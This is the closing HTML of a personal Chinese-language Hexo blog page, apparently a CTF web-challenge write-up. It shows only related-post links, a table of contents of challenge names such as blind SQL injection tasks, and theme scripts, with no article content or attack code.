fa-calendar-alt fa-fw"></i> 2025-05-30</div><div class="title">js study</div></div></a></div><div><a href="/2025/05/31/2025-05-31-css%E5%85%A5%E9%97%A8/" title="css study"><img class="cover" src="/image/41.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-31</div><div class="title">css study</div></div></a></div><div><a href="/2025/06/07/2025-06-07-php%E5%85%A5%E9%97%A8/" title="php study"><img class="cover" src="/image/33.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-07</div><div class="title">php study</div></div></a></div><div><a href="/2025/05/30/2025-05-30-html%E5%85%A5%E9%97%A8/" title="html study"><img class="cover" src="/image/45.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-30</div><div class="title">html study</div></div></a></div><div><a href="/2025/06/02/2025-06-02-web%E5%85%A5%E9%97%A8%E9%A2%98%E5%8D%95/" title="web入门题单"><img class="cover" src="/image/48.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-02</div><div class="title">web入门题单</div></div></a></div><div><a href="/2025/06/09/2025-06-09-sql%E5%85%A5%E9%97%A8/" title="sql study"><img class="cover" src="/image/36.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-09</div><div class="title">sql study</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/imgs/tgrddf55.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">tgrddf55</div><div class="author-info__description">几时归去，做个闲人</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">60</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">29</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/tgrddf55" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://space.bilibili.com/455700704" target="_blank" title="bilibili"><i class="fab fa-bilibili" style="color: #00aeff;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%93%BE%E6%8E%A5"><span class="toc-text">链接</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B0%A2%E8%B0%A2%E7%9A%AE%E8%9B%8B"><span class="toc-text">谢谢皮蛋</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PangBai-%E8%BF%87%E5%AE%B6%E5%AE%B6%EF%BC%881%EF%BC%89"><span class="toc-text">PangBai 过家家（1）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%81%97%E5%A4%B1%E7%9A%84%E6%8B%89%E9%93%BE"><span class="toc-text">遗失的拉链</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%87%AD%E7%9A%AE%E7%9A%84%E8%AE%A1%E7%AE%97%E6%9C%BA"><span class="toc-text">臭皮的计算机</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%99%E7%85%A7%E7%89%87%E6%98%AF%E4%BD%A0%E5%90%97"><span class="toc-text">这照片是你吗</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%87%AD%E7%9A%AE%E8%B8%A9%E8%B8%A9%E8%83%8C"><span class="toc-text">臭皮踩踩背</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#blindsql1"><span class="toc-text">blindsql1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#chocolate"><span class="toc-text">chocolate</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ezcmsss"><span class="toc-text">ezcmsss</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PangBai%E8%BF%87%E5%AE%B6%E5%AE%B6%EF%BC%884%EF%BC%89"><span class="toc-text">PangBai过家家（4）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#blindsql2"><span class="toc-text">blindsql2</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/06/27/2025-06-26-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/" title="php反序列化基础"><img src="/image/52.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="php反序列化基础"/></a><div class="content"><a class="title" href="/2025/06/27/2025-06-26-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/" title="php反序列化基础">php反序列化基础</a><time datetime="2025-06-26T16:00:00.000Z" title="发表于 2025-06-27 00:00:00">2025-06-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/26/2025-06-26-nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="php伪协议"><img src="/image/56.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="php伪协议"/></a><div class="content"><a class="title" href="/2025/06/26/2025-06-26-nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="php伪协议">php伪协议</a><time datetime="2025-06-25T16:00:00.000Z" title="发表于 2025-06-26 00:00:00">2025-06-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/26/2025-06-26-php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="php伪协议"><img src="/image/17.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="php伪协议"/></a><div class="content"><a class="title" href="/2025/06/26/2025-06-26-php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="php伪协议">php伪协议</a><time datetime="2025-06-25T16:00:00.000Z" title="发表于 2025-06-26 00:00:00">2025-06-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/14/2025-06-14-python_ssti/" title="python_ssti"><img src="/image/22.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="python_ssti"/></a><div class="content"><a class="title" href="/2025/06/14/2025-06-14-python_ssti/" title="python_ssti">python_ssti</a><time datetime="2025-06-13T16:00:00.000Z" title="发表于 2025-06-14 00:00:00">2025-06-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/13/2025-06-13-php%E5%BC%B1%E6%AF%94%E8%BE%83/" title="php弱比较"><img src="/image/12.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="php弱比较"/></a><div class="content"><a class="title" href="/2025/06/13/2025-06-13-php%E5%BC%B1%E6%AF%94%E8%BE%83/" title="php弱比较">php弱比较</a><time datetime="2025-06-12T16:00:00.000Z" title="发表于 2025-06-13 00:00:00">2025-06-13</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/image/35.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By tgrddf55</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>